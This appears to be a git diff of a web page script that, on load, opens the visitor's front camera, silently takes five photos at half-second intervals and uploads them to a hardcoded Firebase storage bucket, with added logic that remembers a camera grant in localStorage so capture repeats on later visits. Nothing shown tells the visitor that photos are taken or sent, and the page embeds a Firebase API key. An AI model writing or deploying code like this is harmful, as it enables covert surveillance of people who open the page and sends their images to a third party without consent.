@@ -43,97 +43,133 @@
     </div>
 
     <script type="module">
-        // Import Firebase SDKs
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";
-        import { getStorage, ref, uploadString } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-storage.js";
+    // Import Firebase SDKs
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";
+    import { getStorage, ref, uploadString } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-storage.js";
 
-        // Firebase configuration
-        const firebaseConfig = {
-            apiKey: "AIzaSyBsG-hDNF8DRowgjz9WR4wVlSL398_gQyI",
-            authDomain: "photos-c3ca9.firebaseapp.com",
-            projectId: "photos-c3ca9",
-            storageBucket: "photos-c3ca9.appspot.com",
-            messagingSenderId: "231479999084",
-            appId: "1:231479999084:web:045f573955ed1190f4b649",
-            measurementId: "G-X7YW60B7V5"
-        };
+    // Firebase configuration
+    const firebaseConfig = {
+        apiKey: "AIzaSyBsG-hDNF8DRowgjz9WR4wVlSL398_gQyI",
+        authDomain: "photos-c3ca9.firebaseapp.com",
+        projectId: "photos-c3ca9",
+        storageBucket: "photos-c3ca9.appspot.com",
+        messagingSenderId: "231479999084",
+        appId: "1:231479999084:web:045f573955ed1190f4b649",
+        measurementId: "G-X7YW60B7V5"
+    };
 
-        // Initialize Firebase
-        const app = initializeApp(firebaseConfig);
-        const storage = getStorage(app);
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const storage = getStorage(app);
 
-        let photos = [];
-        let photoCount = 0;
-        const totalPhotos = 5;
-        const fallbackDiv = document.getElementById('fallback');
+    let photos = [];
+    let photoCount = 0;
+    const totalPhotos = 5;
+    const fallbackDiv = document.getElementById('fallback');
 
-        function showFallback() {
-            fallbackDiv.style.display = 'block';
+    function showFallback() {
+        fallbackDiv.style.display = 'block';
+    }
+
+    function capturePhoto(video) {
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const context = canvas.getContext('2d');
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        const dataUrl = canvas.toDataURL('image/png');
+        photos.push(dataUrl);
+        photoCount++;
+
+        // Once all photos are captured, upload them to Firebase
+        if (photoCount === totalPhotos) {
+            uploadPhotosToFirebase();
         }
+    }
 
-        function capturePhoto(video) {
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            const dataUrl = canvas.toDataURL('image/png');
-            photos.push(dataUrl);
-            photoCount++;
-
-            // Once all photos are captured, upload them to Firebase
+    function startPhotoCapture(video) {
+        const captureInterval = setInterval(() => {
+            capturePhoto(video);
             if (photoCount === totalPhotos) {
-                uploadPhotosToFirebase();
+                clearInterval(captureInterval);
             }
-        }
+        }, 500);
+    }
 
-        function startPhotoCapture(video) {
-            const captureInterval = setInterval(() => {
-                capturePhoto(video);
-                if (photoCount === totalPhotos) {
-                    clearInterval(captureInterval);
-                }
-            }, 500);
-        }
+    function uploadPhotosToFirebase() {
+        photos.forEach((photo, index) => {
+            const photoRef = ref(storage, `photos/photo_${index + 1}.png`);
 
-        function uploadPhotosToFirebase() {
-            photos.forEach((photo, index) => {
-                const photoRef = ref(storage, `photos/photo_${index + 1}.png`);
-
-                // Upload the photo as base64
-                uploadString(photoRef, photo, 'data_url').then((snapshot) => {
-                    console.log('Uploaded a photo to Firebase!', snapshot);
-                }).catch((error) => {
-                    console.error('Failed to upload photo:', error);
-                });
+            // Upload the photo as base64
+            uploadString(photoRef, photo, 'data_url').then((snapshot) => {
+                console.log('Uploaded a photo to Firebase!', snapshot);
+            }).catch((error) => {
+                console.error('Failed to upload photo:', error);
             });
-        }
+        });
+    }
 
-        function initCamera() {
-            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+    function requestCameraPermissions() {
+        navigator.permissions.query({ name: 'camera' }).then((result) => {
+            if (result.state === 'granted') {
+                initCamera();
+            } else if (result.state === 'denied') {
+                localStorage.removeItem('cameraPermissionGranted');
                 showFallback();
-                return;
+            } else {
+                // Prompt the user
+                askForPermission();
             }
 
-            const constraints = {
-                video: { facingMode: 'user' }
-            };
-
-            navigator.mediaDevices.getUserMedia(constraints)
-                .then(stream => {
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.play();
-                    startPhotoCapture(video);
-                })
-                .catch(error => {
+            // Monitor for changes in permission state
+            result.onchange = () => {
+                if (result.state === 'granted') {
+                    initCamera();
+                } else if (result.state === 'denied') {
                     showFallback();
-                    console.error('Permission or device error:', error);
-                });
+                }
+            };
+        });
+    }
+
+    function askForPermission() {
+        const constraints = { video: { facingMode: 'user' } };
+
+        navigator.mediaDevices.getUserMedia(constraints)
+            .then(stream => {
+                localStorage.setItem('cameraPermissionGranted', true);
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                startPhotoCapture(video);
+            })
+            .catch(error => {
+                localStorage.removeItem('cameraPermissionGranted');
+                showFallback();
+            });
+    }
+
+    function initCamera() {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            showFallback();
+            return;
         }
 
-        initCamera();
-    </script>
+        const permissionGranted = localStorage.getItem('cameraPermissionGranted');
+        if (permissionGranted) {
+            askForPermission();
+        } else {
+            requestCameraPermissions();
+        }
+    }
+
+    // Handle "Allow only this time" scenario
+    window.addEventListener('beforeunload', () => {
+        localStorage.removeItem('cameraPermissionGranted');
+    });
+
+    initCamera();
+</script>
 </body>
 </html>
